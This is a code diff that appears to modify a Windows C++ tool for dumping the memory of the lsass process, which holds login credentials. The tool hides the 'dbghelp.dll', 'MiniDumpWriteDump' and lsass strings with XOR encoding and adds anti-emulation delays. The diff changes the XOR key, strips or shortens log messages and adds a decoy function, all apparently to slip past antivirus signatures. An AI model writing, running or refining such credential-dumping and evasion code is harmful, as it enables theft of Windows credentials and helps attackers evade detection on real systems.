@@ -7,6 +7,13 @@
 #include <sstream>
 #include <vector>
 
+#include <fstream>
+
+int useless() {
+	std::ifstream("non_existent_file.txt", std::ios::in); // do not optimize away "useless" function
+	return 42; // do not optimize away "useless" function
+}
+
 
 typedef BOOL(WINAPI* MyDumpPtr)(
     HANDLE        hProcess,
@@ -20,8 +27,10 @@ typedef BOOL(WINAPI* MyDumpPtr)(
 
 int main(int argc, char** argv) {
 
+	std::cout << useless() << "\n";
+
     // antiEmulation should be one of the first actions in the EXE
-    std::cout << "Delaying start for about 5 seconds...\n";
+    std::cout << "seconds\n";
 
     auto start_ae_calc = std::chrono::high_resolution_clock::now();
     volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
@@ -29,15 +38,13 @@ int main(int argc, char** argv) {
     auto end_ae_calc = std::chrono::high_resolution_clock::now();
     auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
 
-    std::cout << "Reader started with PID " << GetCurrentProcessId() << "\n";
-    std::cout << "Press ENTER to create a process snapshot" << std::flush;
 	std::cin.get();
 
     // create a snapshot of running procs
     DWORD pid = 0;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) {
-		std::cerr << "Failed to create process snapshot: " << GetLastError() << "\n";
+		std::cerr << "Failed to snapshot: " << GetLastError() << "\n";
         return 1;
     }
     PROCESSENTRY32 pe;
@@ -46,15 +53,15 @@ int main(int argc, char** argv) {
     // init strings
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
     BYTE outFileBytes[] = { 0x06,0x7c,0x19,0x13,0x36,0x23,0x37,0x35,0x19,0x16,0x30,0x24,0x29,0x2f,0x26,0x1a,0x01,0x29,0x32,0x28,0x29,0x29,0x24,0x22,0x36,0x1a,0x29,0x68,0x21,0x2b,0x35,0x46 };
-    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }
 
-    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
-    BYTE dumpLibraryBytes[] = { 0x27,0x26,0x24,0x2c,0x26,0x28,0x33,0x6a,0x27,0x28,0x2f,0x44 };
-    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'EF'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGxcMA
+    BYTE dumpLibraryBytes[] = { 0x21,0x24,0x22,0x2e,0x20,0x2a,0x35,0x68,0x21,0x2a,0x29,0x46 };
+    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
-    BYTE dumpFunctionBytes[] = { 0x0e,0x2d,0x2d,0x2d,0x07,0x31,0x2e,0x34,0x14,0x36,0x2a,0x30,0x26,0x00,0x36,0x29,0x33,0x44 };
-    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+    BYTE dumpFunctionBytes[] = { 0x08,0x2f,0x2b,0x2f,0x01,0x33,0x28,0x36,0x12,0x34,0x2c,0x32,0x20,0x02,0x30,0x2b,0x35,0x46 };
+    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }
 
     char* outFile = reinterpret_cast<char*>(outFileBytes);
     char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
@@ -63,22 +70,21 @@ int main(int argc, char** argv) {
     // open handle to dump file (overwrite if exists)
     HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-		std::cerr << "Failed to create output file " << outFile << ": " << GetLastError() << "\n";
+		std::cerr << "Failed to file " << outFile << ": " << GetLastError() << "\n";
         return 1;
     }
 
-    std::cout << "Press ENTER to resolve dump functions and decondition" << std::flush;
 	std::cin.get();
 
     // resolving functions
     HMODULE hLib = LoadLibraryA(dumpLibrary);
     if (!hLib) {
-        std::cerr << "Failed to load lib " << dumpLibrary << ": " << GetLastError() << "\n";
+        std::cerr << "Failed lib " << dumpLibrary << ": " << GetLastError() << "\n";
         return 1;
     }
     MyDumpPtr MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
     if (!MiniDWriteD) {
-        std::cerr << "Failed to get function addr " << dumpFunction << ": " << GetLastError() << "\n";
+        std::cerr << "Failed to addr " << dumpFunction << ": " << GetLastError() << "\n";
         CloseHandle(hFile);
         return 1;
     }
@@ -109,13 +115,11 @@ int main(int argc, char** argv) {
             } while (Process32Next(snap, &pe) && i < dumps);
         }
         if (i == prev) {
-            std::cout << "Unable to dump any proc\n";
             break; // unable to dump any proc, break
         }
     }
 
     // init strings
-	std::cout << "Press ENTER to find lsass and dump" << std::flush;
 	std::cin.get();
 
     // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
@@ -134,10 +138,10 @@ int main(int argc, char** argv) {
         } while (Process32Next(snap, &pe));
     }
     if (pid != 0) {
-        std::cout << "Got PID=" << pid << "\n";
+        std::cout << "Got=" << pid << "\n";
     }
     else {
-        std::cout << "Unable to find lsass pid\n";
+        std::cout << "Unable pid\n";
         CloseHandle(hFile);
         return 1;
     }
@@ -145,17 +149,17 @@ int main(int argc, char** argv) {
     // open process with all access
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (hProcess == NULL) {
-        std::cout << "Failed to open process: " << GetLastError() << "\n";
+        std::cout << "Failed open: " << GetLastError() << "\n";
         CloseHandle(hFile);
         return 1;
     }
 
     // create mini dump of proc
     if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
-        std::cout << "Failed to create dump: " << GetLastError() << "\n";
+        std::cout << "Failed dump: " << GetLastError() << "\n";
     }
     else {
-        std::cout << "Created dump\n";
+        std::cout << "Created d\n";
     }
 
     CloseHandle(hProcess);
